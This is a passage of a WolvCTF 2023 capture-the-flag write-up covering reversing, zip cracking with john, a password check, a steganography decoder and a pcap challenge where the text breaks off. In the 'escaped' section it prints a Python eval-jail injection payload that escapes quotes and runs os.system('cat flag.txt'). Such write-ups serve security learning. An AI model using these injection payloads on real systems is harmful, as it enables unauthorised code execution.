&lt;p&gt;&lt;code&gt;Flag : wctf{W3lc0me_t0_C0stc0_I_L0v3_Y0u!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;baby-rev&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#baby-rev&quot; aria-label=&quot;Anchor link for: baby-rev&quot;&gt;baby-rev&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_babyrev.png&quot; alt=&quot;Baby rev&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Here is the challenge file &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;wolvctf23&#x2F;baby-re&quot; download&gt;baby-rev&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Simple &lt;code&gt;**strings**&lt;&#x2F;code&gt; did the thing.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_babyrev1.png&quot; alt=&quot;Baby rev&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : wctf{Oh10_Stat3_1s_Smelly!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;we-will-rock-you&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#we-will-rock-you&quot; aria-label=&quot;Anchor link for: we-will-rock-you&quot;&gt;We Will Rock You&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_rockyou.png&quot; alt=&quot;We wil rock you&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We have to crack password protected &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;wolvctf23&#x2F;we_will_rock_you.zip&quot; download&gt;zip file&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Creating hashes from zip file to make john understands it.
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_rockyou1.png&quot; alt=&quot;We will rock you&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Cracking the hashes with the john
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_rockyou2.png&quot; alt=&quot;We will rock you&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Password : michigan4ever&lt;&#x2F;p&gt;
&lt;p&gt;After extracting zip with the password we can find a flag.txt&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : wctf{m1cH1g4n_4_3v3R}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;yowhatsthepassword&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#yowhatsthepassword&quot; aria-label=&quot;Anchor link for: yowhatsthepassword&quot;&gt;yowhatsthepassword&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_yowhats.png&quot; alt=&quot;yowhatsathepassword&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;wolvctf23&#x2F;main.py&quot; download&gt;main.py&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Content of &lt;code&gt;main.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# I&amp;#39;m thinking of a number from 0 to 2^32 - 1
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Can you guess it?
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;random
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;base64
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generate&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;seed&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;  random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;seed&lt;&#x2F;span&gt;&lt;span&gt;(seed)
&lt;&#x2F;span&gt;&lt;span&gt;  c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;}&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;97&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;126&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(c)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;secret &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ly9ppw==&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;base64
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;password? &amp;gt;&amp;gt;&amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;b64decode&lt;&#x2F;span&gt;&lt;span&gt;(secret)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;s:
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;generate&lt;&#x2F;span&gt;&lt;span&gt;(s)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;nope&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A simple condition check was done here. The password of should be &lt;code&gt;int(base64.b64decode(secret).hex(), 16)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_yowhats1.png&quot; alt=&quot;yowhatsathepassword&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, the password is &lt;code&gt;2536466855&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_yowhats2.png&quot; alt=&quot;yowhatsathepassword&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : wctf{ywtp}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;escaped&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#escaped&quot; aria-label=&quot;Anchor link for: escaped&quot;&gt;escaped&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_escaped.png&quot; alt=&quot;escaped&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The challenge file &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;wolvctf23&#x2F;jail.py&quot; download&gt;jail.py&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Content of &lt;code&gt;jail.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Welcome to my `cat` program. Give me a string and I&amp;#39;ll output it back.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;code &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter your string (with double quotes) &amp;gt;&amp;gt;&amp;gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;ast
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;code[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;quot;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;code[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;quot;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;all&lt;&#x2F;span&gt;&lt;span&gt;(ch &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;quot;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;ch &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;code[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]):
&lt;&#x2F;span&gt;&lt;span&gt;  compiled &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;compile&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;print(&amp;quot;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;eval&lt;&#x2F;span&gt;&lt;span&gt;(code) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;quot;)&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;out&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;mode &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;exec&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;exec&lt;&#x2F;span&gt;&lt;span&gt;(compiled)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;eval()&lt;&#x2F;code&gt; function is capable of evaluating the code what we pass to it. But the &lt;code&gt;print(&quot;&#x27; + eval(code) + &#x27;&quot;)&lt;&#x2F;code&gt; is generating the string not the execution of our input code.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_escaped1.png&quot; alt=&quot;escaped&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Now we have to escape the &lt;code&gt;&quot;&lt;&#x2F;code&gt; in the &lt;code&gt;print()&lt;&#x2F;code&gt; to generate the executed output of the passed input.Out input shouldn‚Äôt contain &lt;code&gt;&quot;&lt;&#x2F;code&gt; in the string except at the beginning and end.&lt;&#x2F;p&gt;
&lt;p&gt;The payload can be in this form&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_escaped2.png&quot; alt=&quot;escaped&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The payload to get the flag is &lt;code&gt;&quot;\x22,__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;),\x22&quot;&lt;&#x2F;code&gt;. Here &lt;code&gt;\x22&lt;&#x2F;code&gt; is interpreted as &lt;code&gt;&quot;&lt;&#x2F;code&gt; this will become &lt;code&gt;print(&quot;&quot;,__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;),&quot;&quot;&lt;&#x2F;code&gt;. Therefore it will prints the flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_escaped3.png&quot; alt=&quot;escaped&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : wctf{m30w_uwu_:3}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;elytra&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#elytra&quot; aria-label=&quot;Anchor link for: elytra&quot;&gt;elytra&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_elytra.png&quot; alt=&quot;elytra&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A text file is given &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;wolvctf23&#x2F;iwon.txt&quot; download&gt;iwon.txt&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;When we view the contents of the file in raw format we encounter &lt;code&gt;0xa&lt;&#x2F;code&gt; and &lt;code&gt;0xd&lt;&#x2F;code&gt; repeatedly.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;0xa&lt;&#x2F;code&gt; is  &quot;\n&quot; and &lt;code&gt;0xd&lt;&#x2F;code&gt; is &quot;\r&quot;&lt;&#x2F;p&gt;
&lt;p&gt;When we process it with python we can observe &lt;code&gt;\r&lt;&#x2F;code&gt; in few lines only, so &lt;code&gt;\r&lt;&#x2F;code&gt; is forming a pattern here.&lt;&#x2F;p&gt;
&lt;p&gt;Marking the line as &lt;code&gt;1&lt;&#x2F;code&gt; in which &lt;code&gt;\r&lt;&#x2F;code&gt; is appeared if not as &lt;code&gt;0&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This will generate a binary pattern then we can convert it into ascii to obtain the flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Solution script&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;iwon.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;rb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:
&lt;&#x2F;span&gt;&lt;span&gt;	pattern &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;f:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;i:
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(i)
&lt;&#x2F;span&gt;&lt;span&gt;			pattern&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;			pattern&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;binarystring &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(pattern)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;byte_list &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(binarystring[i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(binarystring)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;)]
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# print(byte_list)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;byte_list:
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span&gt;(i)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;end&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_elytra1.png&quot; alt=&quot;elytra&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : wctf{ggwp}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;dino-trading&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#dino-trading&quot; aria-label=&quot;Anchor link for: dino-trading&quot;&gt;Dino Trading&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;wolv23&#x2F;wolv_dino.png&quot; alt=&quot;dino trading&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is from forensics category. A pcap file is provided &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;wolvctf23&#x2F;download.pcapng&quot; download&gt;download.pcapng&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
